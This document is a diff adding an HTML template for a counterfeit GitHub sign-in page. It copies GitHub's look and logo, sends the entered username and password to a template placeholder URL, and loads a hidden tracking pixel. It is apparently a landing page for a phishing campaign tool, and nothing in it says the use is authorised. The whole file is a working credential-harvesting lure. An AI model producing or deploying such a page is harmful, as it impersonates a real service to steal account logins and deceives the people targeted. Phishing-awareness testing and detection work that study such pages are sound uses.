@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Sign in to GitHub</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif; background: #0d1117; min-height: 100vh; display: flex; flex-direction: column; align-items: center; color: #f0f6fc; }
+        .logo { margin-top: 48px; margin-bottom: 24px; }
+        .logo svg { width: 48px; height: 48px; fill: #f0f6fc; }
+        .login-card { width: 308px; }
+        h1 { font-size: 24px; font-weight: 300; text-align: center; margin-bottom: 16px; color: #f0f6fc; }
+        .card-body { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; margin-bottom: 16px; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 14px; font-weight: 600; color: #f0f6fc; margin-bottom: 8px; }
+        .form-group input { width: 100%; padding: 5px 12px; border: 1px solid #30363d; border-radius: 6px; font-size: 14px; outline: none; background: #0d1117; color: #f0f6fc; line-height: 20px; }
+        .form-group input:focus { border-color: #1f6feb; box-shadow: 0 0 0 3px rgba(31,111,235,0.3); }
+        .forgot-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+        .forgot-row label { font-size: 14px; font-weight: 600; color: #f0f6fc; }
+        .forgot-row a { font-size: 12px; color: #4493f8; text-decoration: none; }
+        .forgot-row a:hover { text-decoration: underline; }
+        .submit-btn { width: 100%; background: #238636; color: #fff; border: 1px solid rgba(240,246,252,0.1); border-radius: 6px; padding: 5px 16px; font-size: 14px; font-weight: 500; cursor: pointer; line-height: 20px; }
+        .submit-btn:hover { background: #2ea043; }
+        .card-footer { background: transparent; border: 1px solid #30363d; border-radius: 6px; padding: 16px 20px; text-align: center; font-size: 14px; }
+        .card-footer a { color: #4493f8; text-decoration: none; }
+        .card-footer a:hover { text-decoration: underline; }
+        .passkey-btn { width: 100%; background: transparent; color: #f0f6fc; border: 1px solid #30363d; border-radius: 6px; padding: 5px 16px; font-size: 14px; cursor: pointer; margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .passkey-btn:hover { border-color: #8b949e; }
+        .passkey-btn svg { width: 16px; height: 16px; fill: #f0f6fc; }
+        .footer { margin-top: 40px; text-align: center; padding: 20px; }
+        .footer a { font-size: 12px; color: #4493f8; text-decoration: none; margin: 0 8px; }
+        .footer a:hover { text-decoration: underline; }
+        @media (max-width: 480px) { .login-card { width: 100%; padding: 0 16px; } }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+    </div>
+    <div class="login-card">
+        <h1>Sign in to GitHub</h1>
+        <div class="card-body">
+            <form action="{{.URL}}" method="POST">
+                <div class="form-group">
+                    <label for="login">Username or email address</label>
+                    <input type="text" id="login" name="login" required autofocus>
+                </div>
+                <div class="forgot-row">
+                    <label for="password">Password</label>
+                    <a href="#">Forgot password?</a>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <button type="submit" class="submit-btn">Sign in</button>
+            </form>
+            <button class="passkey-btn">
+                <svg viewBox="0 0 16 16"><path d="M9.5 7a2.5 2.5 0 100-5 2.5 2.5 0 000 5zm0 1.5c-2.03 0-6 1.02-6 3.05V13h12v-1.45c0-2.03-3.97-3.05-6-3.05z"/></svg>
+                Sign in with a passkey
+            </button>
+        </div>
+        <div class="card-footer">
+            New to GitHub? <a href="#">Create an account</a>.
+        </div>
+    </div>
+    <div class="footer">
+        <a href="#">Terms</a>
+        <a href="#">Privacy</a>
+        <a href="#">Docs</a>
+        <a href="#">Contact GitHub Support</a>
+    </div>
+    <img src="{{.Tracker}}" style="display:none" alt="">
+</body>
+</html>
